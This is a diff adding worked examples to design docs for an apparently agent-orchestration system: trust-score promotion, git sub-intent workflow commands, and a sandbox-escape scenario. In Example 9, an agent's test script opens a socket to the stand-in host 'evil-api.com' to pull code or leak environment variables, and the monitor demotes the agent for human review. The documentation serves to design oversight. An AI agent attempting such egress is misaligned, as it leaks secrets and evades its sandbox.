@@ -1472,6 +1472,230 @@ failure_modes = kb.find_failure_modes(module_path="holon/metrics/p_success.py")
 # - Or decompose more finely to avoid file overlap
 ```
 
+## Example 8: Trust Level Progression Walkthrough
+
+### Scenario
+
+A new agent `gemini-coder-01` starts at the **Baseline** trust level and is promoted to **Medium** trust after
+completing 10 successful intents with high calibration accuracy.
+
+### Execution
+
+#### 1) Initial state in Ledger
+
+```json
+{
+  "agent_id": "gemini-coder-01",
+  "trust_level": "baseline",
+  "executions_completed": 0,
+  "trust_score": 0.0
+}
+```
+
+#### 2) Agent completes 10 baseline intents successfully
+
+Over the course of 10 simple intents (e.g., adding unit tests, documentation, simple refactoring), the agent achieves:
+
+- **Success Rate:** $100\%$ ($10$ out of $10$ succeed).
+- **Predictions vs. Actuals:**
+    - Plotted average predicted $P(success) = 0.85$. Actual success for all was $1.0$.
+    - Mean calibration error: $0.15$.
+    - Mean entropy error: $0.8$ (predicted entropy average was $3.0$; actual was $3.8$).
+- **Incident History:**
+    - Sandbox escapes: $0$.
+    - Rebase conflicts: $0$.
+
+#### 3) Trust score calculation
+
+Upon the 10th execution completion, the system executes `compute_trust_score` using bootstrap weights from
+`trust_levels.json`:
+
+- `weights.success_rate = 0.4`
+- `weights.calibration = 0.3`
+- `weights.entropy = 0.2`
+- `weights.rebase = 0.1`
+
+$$\text{Trust Score} = 0.4 \cdot (1.0) + 0.3 \cdot (1 - 0.15) + 0.2 \cdot \left(1 - \frac{0.8}{50}\right) + 0.1 \cdot (1.0) - 0.0$$
+$$\text{Trust Score} = 0.4 + 0.255 + 0.1968 + 0.1 = 0.9518$$
+
+#### 4) Promotion trigger
+
+Because `executions_completed` $\ge 10$ and `trust_score` $\ge 0.70$, the system promotes the agent to **Medium** trust
+and logs the promotion to the ledger:
+
+```json
+{
+  "event_type": "agent_trust_promoted",
+  "seq": 512,
+  "payload": {
+    "agent_id": "gemini-coder-01",
+    "previous_level": "baseline",
+    "new_level": "medium",
+    "trust_score": 0.9518,
+    "execution_count": 10
+  }
+}
+```
+
+The agent is now permitted to autonomously spawn sub-intents up to a depth of 3.
+
+---
+
+## Example 9: Safety Incident & Sandbox Escape Handling
+
+### Scenario
+
+An agent `coder-alpha` with **Medium** trust attempts to execute a plan containing an unauthorized socket connection to
+an external address `evil-api.com` during unit testing, triggering instant sandbox termination and trust degradation.
+
+### Execution
+
+#### 1) Plan Execution inside Sandbox
+
+The runner boots a secure Docker/gVisor sandbox with network policies restricting outbound connections.
+
+#### 2) Outbound Network Request Intercepted
+
+The agent's test script attempts to fetch code or upload environment variables:
+
+```python
+# Agent script tries:
+import socket
+socket.create_connection(("evil-api.com", 80), timeout=2)
+```
+
+#### 3) Sandbox Termination & Ledger Logging
+
+The runtime manager's security daemon intercepts the syscall and instantly kills the container. It writes a failure
+event to the Evolution Ledger:
+
+```json
+{
+  "event_type": "sandbox_escape_attempted",
+  "seq": 601,
+  "payload": {
+    "agent_id": "coder-alpha",
+    "intent_id": "I-045-read-api-key",
+    "violation_type": "network_egress_violation",
+    "syscall": "connect",
+    "destination": "evil-api.com:80"
+  }
+}
+```
+
+#### 4) Trust Score Degradation
+
+The trust calculator runs immediately. With `sandbox_escapes = 1` and a heavy `escape_penalty = 1.0`:
+$$\text{Trust Score} = \text{base\_score} - 1.0 \cdot 1 = 0.0$$
+
+The trust score drops to $0.0$.
+
+#### 5) Demotion & Alerting
+
+The system demotes `coder-alpha` to **Baseline** trust, deletes the temporary work branch, and triggers human review:
+
+```json
+{
+  "event_type": "agent_trust_degraded",
+  "seq": 602,
+  "payload": {
+    "agent_id": "coder-alpha",
+    "previous_level": "medium",
+    "new_level": "baseline",
+    "reason": "sandbox_escape_attempted",
+    "requires_human_unlock": true
+  }
+}
+```
+
+All future work for `coder-alpha` is paused until a human reviews the code changes and manually resets the agent's trust
+status.
+
+---
+
+## Example 10: Concrete Git Workflow Commands for Sub-Intents
+
+### Scenario
+
+This walkthrough details the exact `git` commands executed by the orchestrator harness to manage a parent-centric branch
+workflow when executing a sub-intent.
+
+**Intent Context:**
+
+- Root Intent: `I-100-refactor-api`
+    - Current Branch: `I-100-refactor-api/_`
+- Sub-Intent: `I-101-add-serializers`
+    - Sub-Branch: `I-100-refactor-api/I-101-add-serializers/_`
+
+### Git Command Sequence
+
+#### 1) Spawn the sub-intent branch from the parent branch tip
+
+```bash
+# Ensure local tracking is up-to-date
+git fetch origin
+
+# Create and checkout the sub-branch rooted at the current parent branch tip
+git checkout -b I-100-refactor-api/I-101-add-serializers/_ origin/I-100-refactor-api/_
+```
+
+#### 2) Write code and run tests inside the isolated sandbox
+
+The agent modifies the codebase (e.g., creating `holon/api/serializers.py`).
+
+#### 3) Commit the changes within the sandbox
+
+```bash
+# Stage the modified files
+git add holon/api/serializers.py tests/test_serializers.py
+
+# Commit with semantic message
+git commit -m "feat: implement JSON serializers for api payloads"
+```
+
+#### 4) Rebase onto the latest parent branch (handling concurrency)
+
+If a sibling sub-intent branch was merged into `I-100-refactor-api/_` while `I-101` was executing, the harness pulls
+updates and rebases:
+
+```bash
+# Fetch latest parent commits
+git fetch origin
+
+# Rebase local work onto the updated parent branch tip
+git rebase origin/I-100-refactor-api/_
+```
+
+#### 5) Push and trigger automatic merge evaluation
+
+Once tests pass on the rebased code, the branch is pushed and merged into the parent:
+
+```bash
+# Push branch to remote
+git push origin I-100-refactor-api/I-101-add-serializers/_
+
+# Switch back to the parent branch
+git checkout I-100-refactor-api/_
+
+# Merge the sub-intent branch with no-fast-forward to preserve history
+git merge --no-ff I-100-refactor-api/I-101-add-serializers/_ -m "merge: sub-intent I-101-add-serializers"
+
+# Push the merged parent branch
+git push origin I-100-refactor-api/_
+```
+
+#### 6) Branch namespace cleanup
+
+The remote and local sub-branches are immediately pruned to maintain system cleanliness:
+
+```bash
+# Delete local sub-branch
+git branch -d I-100-refactor-api/I-101-add-serializers/_
+
+# Delete remote sub-branch
+git push origin --delete I-100-refactor-api/I-101-add-serializers/_
+```
+
 ---
 
 ## Summary of examples
@@ -1485,6 +1709,9 @@ failure_modes = kb.find_failure_modes(module_path="holon/metrics/p_success.py")
 | 5       | KB pattern extraction, evidence validation, pattern reuse in future planning          |
 | 6       | Model routing based on complexity, ROI measurement                                    |
 | 7       | Failure mode extraction, mitigation identification, failure avoidance                 |
+| 8       | Trust level progression, trust scoring formulas, and tier promotions                  |
+| 9       | Sandbox network/file egress violations, security alerts, and trust demotion           |
+| 10      | Concrete git terminal commands for branching, rebasing, and merging sub-intents       |
 
 ---
 
